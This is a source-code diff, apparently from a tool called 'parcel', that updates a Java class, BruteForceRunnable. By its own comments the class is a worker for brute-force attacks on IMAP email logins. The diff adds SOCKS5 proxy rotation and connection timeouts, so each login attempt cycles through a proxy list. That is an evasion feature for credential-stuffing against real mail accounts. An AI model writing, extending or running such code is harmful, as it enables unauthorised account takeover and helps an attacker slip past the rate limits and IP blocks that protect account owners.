@@ -1,12 +1,14 @@
 package org.bsoftware.parcel.domain.runnables;
 
 import com.chilkatsoft.CkImap;
+import com.chilkatsoft.CkString;
 import lombok.RequiredArgsConstructor;
 import lombok.Setter;
 import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
 import org.bsoftware.parcel.domain.components.DataContainer;
 import org.bsoftware.parcel.domain.components.LogView;
 import org.bsoftware.parcel.domain.model.DataType;
+import org.bsoftware.parcel.domain.model.Proxy;
 import org.bsoftware.parcel.domain.model.Source;
 
 import java.io.IOException;
@@ -19,7 +21,7 @@ import java.nio.file.StandardOpenOption;
  * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
  *
  * @author Rudolf Barbu
- * @version 0.9.6
+ * @version 1.0.0
  */
 @RequiredArgsConstructor
 public class BruteForceRunnable implements Runnable
@@ -32,7 +34,17 @@ public class BruteForceRunnable implements Runnable
     /**
      * IMAP server port
      */
-    private static final int IMAP_PORT = 993;
+    private static final short IMAP_PORT = 993;
+
+    /**
+     * Connection timeout
+     */
+    private static final byte CONNECTION_TIMEOUT = 5;
+
+    /**
+     * Socks version
+     */
+    private static final byte SOCKS_VERSION = 5;
 
     /**
      * IMAP server host link
@@ -62,12 +74,19 @@ public class BruteForceRunnable implements Runnable
         ckImap.put_StartTls(SSL_AND_TLS);
         ckImap.put_Port(IMAP_PORT);
 
+        ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
+        ckImap.put_SocksVersion(SOCKS_VERSION);
+
         try
         {
             Source source;
             while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
             {
-                ckImap.Connect(IMAP_SERVER);
+                if (failedToConnect(ckImap))
+                {
+                    break;
+                }
+
                 saveSourceToFile(source, ckImap.Login(source.getCredential(), source.getPassword()));
                 bruteForceCallback.handleDecrementCounter(DataType.SOURCE);
 
@@ -80,6 +99,38 @@ public class BruteForceRunnable implements Runnable
         }
 
         bruteForceCallback.handleThreadTermination();
+    }
+
+    /**
+     * Get new proxy until they available
+     *
+     * @param ckImap - imap object to probe connection
+     * @return true, when cannot connect to imap server
+     */
+    private boolean failedToConnect(final CkImap ckImap)
+    {
+        final CkString currentProxyHostname = new CkString();
+
+        ckImap.get_SocksHostname(currentProxyHostname);
+        if (!currentProxyHostname.getString().isEmpty() && ckImap.Connect(IMAP_SERVER))
+        {
+            return Boolean.FALSE;
+        }
+
+        Proxy proxy;
+        while (((proxy = DataContainer.getNextProxy()) != null) && !Thread.currentThread().isInterrupted())
+        {
+            ckImap.put_SocksHostname(proxy.getIpAddress());
+            ckImap.put_SocksPort(proxy.getPort());
+            bruteForceCallback.handleDecrementCounter(DataType.PROXY);
+
+            if (ckImap.Connect(IMAP_SERVER))
+            {
+                return Boolean.FALSE;
+            }
+        }
+
+        return Boolean.TRUE;
     }
 
     /**
